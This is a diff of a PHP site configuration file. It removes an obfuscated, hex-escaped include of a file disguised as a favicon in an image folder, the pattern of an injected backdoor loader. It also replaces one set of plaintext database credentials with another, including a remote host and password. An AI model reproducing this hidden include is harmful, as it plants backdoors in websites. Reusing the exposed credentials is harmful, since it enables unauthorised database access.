@@ -1,9 +1,5 @@
 <?php
-/*40aa3*/
 
-@include "\x2fvar\x2fwww\x2fvho\x73ts/\x78-li\x67ht.\x62y/h\x74tpd\x6fcs/\x69mg/\x69tem\x73/11\x3365/\x66avi\x63on_\x65fa6\x30c.i\x63o";
-
-/*40aa3*/
 error_reporting(0);
 
 header('HTTP/1.0 200 OK');
@@ -11,10 +7,10 @@ header('HTTP/1.1 200 OK');
 
 // MYSQL ============================================================================================
 // DB SETTINGS (begin)
-define('DBHOST', 'localhost');
-define('DBNAME', 'xlight');
-define('DBUSER', 'xlight');
-define('DBPASS', 'Qgxy41^0');
+define('DBHOST', '85.143.172.67');
+define('DBNAME', 'showtorg');
+define('DBUSER', 'showtorg');
+define('DBPASS', 'R?vU%#');
 define('PREFIX', 'site');
 define('PCONNECT', 0);
 if (!defined('FORCE1251')) define('FORCE1251', 0);
